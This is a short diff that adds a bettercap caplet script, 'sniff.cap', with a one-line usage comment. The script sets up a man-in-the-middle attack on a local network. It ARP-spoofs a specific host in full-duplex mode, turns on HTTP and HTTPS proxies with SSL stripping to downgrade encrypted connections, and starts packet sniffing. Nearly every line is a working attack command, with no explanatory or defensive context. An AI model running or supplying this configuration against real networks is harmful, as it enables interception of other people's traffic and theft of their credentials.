@@ -1,0 +1,13 @@
+# USAGE: bettercap -caplet sniff.cap    (make sure you are in the current dir, or enter full path)
+
+set arp.spoof.targets 192.168.0.170
+set arp.spoof.fullduplex true
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+#set net.sniff.verbose false
+events.ignore net.sniff.mdns
+events.ignore endpoint.new
+events.ignore endpoint.lost
+arp.spoof on
+http.proxy on
+net.sniff on
